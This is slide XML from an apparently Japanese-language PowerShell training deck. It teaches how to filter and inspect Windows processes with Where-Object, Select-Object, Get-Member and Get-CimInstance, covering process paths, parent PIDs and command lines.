              </a:rPr>
              <a:t>列</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="0071BC"/>
                </a:highlight>
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>3</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2400" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>, …</a:t>
            </a:r>
            <a:endParaRPr lang="ja-JP" altLang="en-US" sz="2400" b="1" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="just">
              <a:spcBef>
                <a:spcPts val="900"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="2400" b="1" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
            </a:endParaRPr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013FFF68-392D-0EA1-FD11-AAA5DEB46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828" y="1362254"/>
            <a:ext cx="10440989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既定では、フィールド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4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つまでだと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Table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で、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5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つ以上は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List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で表示される。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="13460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FBD20980-7912-54F4-4A7D-E70444E87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プロセス </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>| </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>条件を満たすオブジェクトを抽出する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C831E70-6F83-7646-E6D8-C6DEAEA76F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A16958A-80EC-8CA8-E1A0-4E3BCCE9B4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11</a:t>
            </a:fld>
            <a:endParaRPr lang="ja-JP" altLang="en-US" dirty="0"/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B1DDEDD3-5FB3-9F94-1D9E-E526F9827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858198"/>
            <a:ext cx="10440989" cy="113107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Where-Object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 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{</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="0071BC"/>
                </a:highlight>
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t> 条件式 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}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で条件を満たすオブジェクトを抽出し（行の削減）、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en-US" altLang="ja-JP" sz="2200" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>Select-Object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で必要なフィールドを選択する（列の削減）。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" lvl="0" indent="-342900" algn="just">
              <a:spcBef>
                <a:spcPts val="900"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="l"/>
            </a:pPr>
            <a:endParaRPr lang="ja-JP" altLang="en-US" sz="2200" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:cs typeface="メイリオ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55C0B23-C6DE-B502-4B0E-091F8D60628C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="884992" y="1607892"/>
            <a:ext cx="10143556" cy="1785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Get-Process | Where-Object {</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFC000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>$_</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.Path </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="92D050"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>-like </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"*temp*"}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Select-Object Id, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ProcessName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>, Path</a:t>
            </a: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   Id </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ProcessName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> Path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   -- ----------- ----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24164 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>aio</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>         C:\Users\swat\AppData\Local\Temp\aio.exe</a:t>
            </a:r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C985EBA0-5C0D-D38D-5E89-5B174465E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336" y="3501008"/>
            <a:ext cx="10119207" cy="7925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solidFill>
                  <a:srgbClr val="FFC000"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>$_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 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: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 パイプを流れてきた現在のオブジェクトを示す</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2200" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>自動変数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。</a:t>
            </a:r>
          </a:p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solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>-like 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: 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ワイルドカードが使える文字列比較の</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2200" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>演算子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。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="6" name="表 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A9A4F725-997A-3012-0A47-A826E21A5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975736"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="884992" y="4955572"/>
          <a:ext cx="4676302" cy="74168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4290245929"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="2444054">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3382432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$</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="180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PSVersionTable</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="18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バージョン情報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943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$?</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="18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直前の処理の成否 </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="18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T/F</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="18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370361"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="11" name="表 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CFDECD10-369D-C3B4-03B0-BC8196E2F6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852340"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="6456040" y="4944772"/>
          <a:ext cx="4676302" cy="111252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628292">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="4290245929"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="2048010">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3382432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-like / -</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="180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notlike</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="18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ワイルドカードで比較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370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-match / -</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="180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notmatch</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="18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正規表現で比較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033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-replace A, B</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="18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A</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="18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を</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="18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B</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="18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に置換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390518"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="AutoShape 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D6B6EF60-1AD5-737F-8E82-50086D3E3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20" y="4538356"/>
            <a:ext cx="3671890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+mn-ea"/>
                <a:ea typeface="游ゴシック" panose="020B0400000000000000" pitchFamily="50" charset="-128"/>
                <a:cs typeface="メイリオ" panose="020B0604030504040204" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>▍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自動変数、環境変数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3" name="AutoShape 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{18A83580-A39F-6CAE-8EDD-E5741CDA0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992" y="5780239"/>
            <a:ext cx="3852428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$true / $false / $null</a:t>
            </a:r>
            <a:endParaRPr lang="ja-JP" altLang="en-US" sz="2200" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="AutoShape 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0211E8B0-E520-2AF6-6BEE-02798E6FE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363" y="4538356"/>
            <a:ext cx="3671890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+mn-ea"/>
                <a:ea typeface="游ゴシック" panose="020B0400000000000000" pitchFamily="50" charset="-128"/>
                <a:cs typeface="メイリオ" panose="020B0604030504040204" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>▍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演算子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7" name="AutoShape 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FEA7F64C-C6D2-AC28-2A9B-07B6DD3ED7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040" y="6150786"/>
            <a:ext cx="4859660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-eq / -ne / -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2200" dirty="0" err="1">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>gt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 / -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2200" dirty="0" err="1">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>ge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 / -and / -or </a:t>
            </a:r>
            <a:endParaRPr lang="ja-JP" altLang="en-US" sz="2200" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
            </a:endParaRPr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13B196C8-C441-55FF-97D1-DBC483DA9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649571"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="887218" y="6129300"/>
          <a:ext cx="4676302" cy="37084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2794633725"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="2444054">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="253753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$env:</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="18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環境変数名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8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環境変数の値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809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7156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F8EA2E56-B37D-78C8-F10B-4CEBD0A2A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プロセス </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>| </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>オブジェクトのプロパティを確認する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79B5F6F-91A7-8655-3348-3EE4F79C56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5B2B98-D3CE-7987-3F5A-6D555C96DE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12</a:t>
            </a:fld>
            <a:endParaRPr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81B7213-E561-B5D5-E857-C70952F5499E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="884992" y="1232756"/>
            <a:ext cx="10143556" cy="13234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Get-Process </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>svchost</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> | Select-Object * -First 1 | Format-List</a:t>
            </a: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Name                      : </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>svchost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Id                        : 1236</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="1000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>. . .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EDA4582-2801-8524-6CE3-C3111D7F6D1B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="884992" y="3158966"/>
            <a:ext cx="10143556" cy="31700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Get-Process </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>svchost</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>| Get-Member -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>MemberType</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> Propert</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFC000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ies</a:t>
            </a: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   TypeName: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>System.Diagnostics.Process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Name                       </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>MemberType</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>     Definition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----                       ----------     ----------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Handles                    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>AliasProperty</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>  Handles = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Handlecount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Name                       </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>AliasProperty</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>  Name = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ProcessName</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="1000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>. . . 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__</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>NounName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>                 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>NoteProperty</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>   string __</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>NounName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>=Process</a:t>
            </a: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BasePriority</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>               Property       int </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>BasePriority</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> {get;}</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="1000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>. . . 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D579B3FA-2B59-8F32-AAC4-5532443AE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894202"/>
            <a:ext cx="10440989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Select-Object *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で全プロパティが表示できる。</a:t>
            </a:r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E7E9D6B0-16A1-CDB0-E4B1-646244128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2820412"/>
            <a:ext cx="10440989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型の情報もほしければ、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2200" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>Get-Member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を使う。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="168376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FBD20980-7912-54F4-4A7D-E70444E87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プロセス </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>| Get-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0" err="1"/>
              <a:t>CimInstance</a:t>
            </a:r>
            <a:endParaRPr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C831E70-6F83-7646-E6D8-C6DEAEA76F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A16958A-80EC-8CA8-E1A0-4E3BCCE9B4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13</a:t>
            </a:fld>
            <a:endParaRPr lang="ja-JP" altLang="en-US" dirty="0"/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DA4634D2-4BA1-563F-1BCC-200E1E915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20" y="961505"/>
            <a:ext cx="3671890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+mn-ea"/>
                <a:ea typeface="游ゴシック" panose="020B0400000000000000" pitchFamily="50" charset="-128"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>▍</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" sz="2400" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="游ゴシック" panose="020B0400000000000000" pitchFamily="50" charset="-128"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>Get-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" sz="2400" b="1" dirty="0" err="1">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="游ゴシック" panose="020B0400000000000000" pitchFamily="50" charset="-128"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>CimInstance</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="2400" b="1" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
            </a:endParaRP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B1DDEDD3-5FB3-9F94-1D9E-E526F9827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1362254"/>
            <a:ext cx="10440989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特定のプロセスで、①パス、②親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PID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、③コマンドラインを取り出す。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55C0B23-C6DE-B502-4B0E-091F8D60628C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="884992" y="1700808"/>
            <a:ext cx="10143556" cy="2708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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>CimInstance</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> -Class Win32_Process -Filter "Name = 'svchost</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFC000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.exe</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>'"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Select-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP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ProcessId</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>, Name, Path, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>parentProcessId</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>CommandLine</a:t>
            </a:r>
            <a:r>
